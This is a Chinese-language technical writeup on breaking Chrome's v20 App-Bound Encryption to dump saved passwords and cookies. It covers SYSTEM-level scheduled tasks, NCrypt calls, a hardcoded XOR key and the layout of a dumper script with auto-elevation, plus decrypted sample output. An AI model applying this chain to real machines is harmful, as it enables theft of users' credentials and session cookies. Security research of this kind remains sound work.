# Chrome v20 App-Bound Encryption — 解題 Writeup

## 背景

Chrome 127（2024 年 7 月）開始在 Windows 上引入 **App-Bound Encryption（ABE）**，
將原本只用 DPAPI 保護的密碼加密金鑰，改以更複雜的多層機制保護。
加密後的值在資料庫內以 `v20` 前綴標識（舊版為 `v10`/`v11`）。
Chrome 137（2025 年 5 月）再次升級至最難的 **flag=3**，加入 CNG（NCrypt）硬體保護層。

---

## 問題起點

執行舊工具，`passwords.json` 內所有密碼顯示 `<decryption failed>`。

分析發現：
- `Local State` → `os_crypt.app_bound_encrypted_key` 存在
- 密碼資料庫欄位前綴為 `v20`（非 `v10`/`v11`）
- 舊工具只會呼叫 `CryptUnprotectData`，完全不支援 v20

---

## 加密架構分析

### Local State 中的 `app_bound_encrypted_key`

這個 Base64 字串解碼後結構如下：

```
[4 bytes: "APPB"] [N bytes: DPAPI(SYSTEM) encrypted blob]
```

Chrome 的 `elevation_service.exe`（以 SYSTEM 身份運行）負責加密這把 key。
因此解密也需要 SYSTEM 身份才能完成第一層 DPAPI。

### 完整解密鏈（flag=3，Chrome 137+）

```
app_bound_encrypted_key (Base64)
        │
        ▼ strip "APPB" prefix (4 bytes)
        │
        ▼ CryptUnprotectData (SYSTEM context)   ← 第一層：需要 SYSTEM 身份
        │
        ▼ CryptUnprotectData (user context)     ← 第二層：目前使用者 DPAPI
        │
        ▼ parse payload:
        │   [uint32 val_len][validation_data][uint32 content_len][content]
        │
        ▼ content[0] = flag byte
        │
        flag=3 (Chrome 137+):
        ├─ encrypted_aes_key = content[1:33]    (32 bytes)
        ├─ iv                = content[33:45]   (12 bytes)
        ├─ ct                = content[45:77]   (32 bytes)
        └─ tag               = content[77:93]   (16 bytes)
                │
                ▼ NCryptDecrypt("Google Chromekey1", SYSTEM KSP)  ← 第三層：CNG 硬體保護
                │   decrypted_aes_key (32 bytes)
                │
                ▼ XOR with hardcoded key (embedded in elevation_service.exe)
                │   actual_aes_key (32 bytes)
                │
                ▼ AES-256-GCM decrypt(iv, ct, tag, actual_aes_key)
                │
                └─► master_key (32 bytes)  ← 用來解密所有 v20 密碼/Cookie
```

### 密碼/Cookie 解密

拿到 `master_key` 後，v20 加密欄位解密方式：

```
encrypted_value = b"v20" + nonce(12B) + ciphertext + tag(16B)

AES-256-GCM.decrypt(
    key   = master_key,
    nonce = encrypted_value[3:15],
    ct    = encrypted_value[15:-16],
    tag   = encrypted_value[-16:]
) → plaintext
```

Cookie 的 plaintext 還會多 32 bytes 的 binding-policy 前綴，需要額外截掉。

---

## 關鍵技術難點與解法

### 難點 1：第一層 DPAPI 需要 SYSTEM 身份

`CryptUnprotectData` 在 SYSTEM 加密的資料上，普通使用者呼叫會直接失敗。

**解法：Windows Scheduled Task XML**

透過 `schtasks /create /xml` 建立以 `S-1-5-18`（LocalSystem）身份執行的排程工作：

```xml
<Principal id="Author">
  <UserId>S-1-5-18</UserId>
  <RunLevel>HighestAvailable</RunLevel>
</Principal>
```

將 DPAPI 解密邏輯寫成獨立 Python 腳本，透過排程工作以 SYSTEM 身份執行，
用檔案（`C:\Windows\Temp\...`）交換輸入/輸出。

**為什麼用 XML 而不是 PowerShell？**
PowerShell 的 here-string / 字串跳脫在路徑含空格時極易出錯；
XML 方式可以安全地將路徑嵌入 `<Arguments>` 標籤，完全繞過引號問題。

### 難點 2：CNG 金鑰（flag=3）

Chrome 137+ 的 `elevation_service.exe` 在安裝時於 SYSTEM 的 **CNG Key Storage Provider（KSP）** 中建立一把 RSA 或對稱金鑰，名稱為：

```
Google Chromekey1
Provider: Microsoft Software Key Storage Provider
```

這把 key 只有 SYSTEM 可以存取，同樣透過排程工作以 SYSTEM 身份呼叫 NCrypt API：

```python
ncrypt_dll.NCryptOpenStorageProvider(hProvider, "Microsoft Software Key Storage Provider", 0)
ncrypt_dll.NCryptOpenKey(hProvider, hKey, "Google Chromekey1", 0, 0)
ncrypt_dll.NCryptDecrypt(hKey, input, ..., output, ..., NCRYPT_SILENT_FLAG)
```

### 難點 3：XOR 混淆層

NCrypt 解密出來的 32 bytes 並非最終 AES key，而是 XOR 過的版本。
XOR key 硬編碼在 `elevation_service.exe` 中（透過逆向工程取得，公開於 `runassu/chrome_v20_decryption`）：

```python
_FLAG3_XOR = bytes.fromhex(
    "CCF8A1CEC56605B8517552BA1A2D061C"
    "03A29E90274FB2FCF59BA4B75C392390"
)
actual_aes_key = bytes(a ^ b for a, b in zip(ncrypt_result, _FLAG3_XOR))
```

### 難點 4：Cookie 多出 32 bytes 前綴

解密後的 Cookie value 開頭有 32 bytes 的 binding-policy metadata，
直接存出來會是亂碼。需要判斷是 v20 且為 cookie 時截掉前 32 bytes：

```python
if strip_v20_prefix and prefix == b"v20" and len(plaintext) > 32:
    plaintext = plaintext[32:]
```

---

## 各 Chrome 版本的 flag 對應表

| Flag | Chrome 版本  | 演算法                      | 硬編碼 Key 來源         |
|------|-------------|---------------------------|------------------------|
| 1    | 127 – 132   | AES-256-GCM               | elevation_service.exe  |
| 2    | 133 – 136   | ChaCha20-Poly1305         | elevation_service.exe  |
| 3    | 137+        | NCrypt + XOR + AES-256-GCM | CNG KSP + elevation_service.exe |

---

## 實作架構（app.py）

```
app.py
├── _OUTER_DPAPI_SCRIPT     # 以 SYSTEM 身份執行的 CryptUnprotectData 腳本
├── _NCRYPT_DECRYPT_SCRIPT  # 以 SYSTEM 身份執行的 NCryptDecrypt 腳本
├── _FLAG1_KEY / _FLAG2_KEY / _FLAG3_XOR  # 硬編碼常數
│
├── _outer_dpapi_as_system(ciphertext)    # 建立 XML 排程工作 → 呼叫 SYSTEM DPAPI
├── _ncrypt_decrypt_as_system(data)       # 建立 XML 排程工作 → 呼叫 SYSTEM NCrypt
│
├── get_app_bound_key()     # 完整解密鏈，回傳 32-byte master key
├── decrypt_value(key, encrypted_value, app_bound_key, strip_v20_prefix)
│
├── dump_passwords()        # 讀 Login Data SQLite，解密每筆密碼
├── dump_cookies()          # 讀 Network/Cookies SQLite，解密每筆 Cookie（含前綴截除）
├── dump_history()          # 讀 History SQLite
├── dump_bookmarks()        # 讀 Bookmarks JSON
└── main()                  # UAC 自動提權 → 依序呼叫各 dump 函式
```

---

## 執行結果驗證

```
=== Chrome Browser Data Dumper ===

Obtaining encryption key (v10/v11)...  OK
Obtaining app-bound key (v20, Chrome 137+)... OK (key length: 32 bytes)
Passwords...  -> passwords.json (1 records)
Cookies...    -> cookies.json   (2 records)
Done.
```

**passwords.json（解密成功）：**
```json
{"url": "https://test.com/", "username": "admin", "password": "P@ssw0rd"}
```

**cookies.json（解密成功，前綴已截除）：**
```json
{"host": ".google.com", "name": "NID", "value": "531=HAmuycxVY4Op..."}
{"host": "ogs.google.com", "name": "OTZ", "value": "8597192_24_24__24_"}
```

---

## 參考資料

- [Chromium source: components/os_crypt/](https://chromium.googlesource.com/chromium/src/+/main/components/os_crypt/)
- [snovvcrash/chrome_v20_decryption](https://github.com/runassu/chrome_v20_decryption) — 逆向 elevation_service.exe 取得硬編碼 key
- [Alexander Hagenah — Chrome App-Bound Encryption Analysis](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- Windows CNG API: `NCryptOpenStorageProvider`, `NCryptOpenKey`, `NCryptDecrypt`
- Win32 `CryptUnprotectData` MSDN 文件
